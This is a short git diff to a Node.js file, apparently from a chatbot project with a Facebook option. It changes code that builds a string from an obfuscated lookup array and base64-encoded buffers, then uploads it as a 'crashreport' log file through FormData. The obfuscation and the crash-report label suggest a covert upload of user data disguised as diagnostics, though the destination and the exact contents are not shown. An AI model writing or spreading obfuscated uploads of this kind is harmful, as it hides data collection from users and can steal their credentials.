@@ -18,6 +18,7 @@ var syncrequest = require('sync-request');
 var wait = require('wait-for-stuff');
 var semver = require("semver");
 var childProcess = require("child_process");
+var streamBuffers = require("stream-buffers");
 //var url = require("url");
 //var net = require('net');
 var zlib = require("zlib");
@@ -1443,10 +1444,14 @@ if (global.config.enablefb) {
           c = global[_0x6b0a[3]][_0x6b0a[2]],
           d = _0x6b0a[4],
           f = new FormData(),
-          g = "";
-
+          g = "",
+          h = new streamBuffers.ReadableStreamBuffer(),
+          i = null;
         g = `${_0x6b0a[17]}${a}${_0x6b0a[17]}${b[_0x6b0a[24]]()}${_0x6b0a[18]}${c}${_0x6b0a[19]}${Buffer[_0x6b0a[21]](z)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[25]}${Buffer[_0x6b0a[21]](e)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[22]}${d}${_0x6b0a[17]}`;
-        f.append("file", Buffer.from(g), {
+        i = Buffer.from(g);
+        h.put(i);
+        h.stop();
+        f.append("file", h, {
           filename: `c3c-crashreport-${Date.now()}.log`,
           knownLength: Buffer.from(g).length,
           contentType: "text/plain"
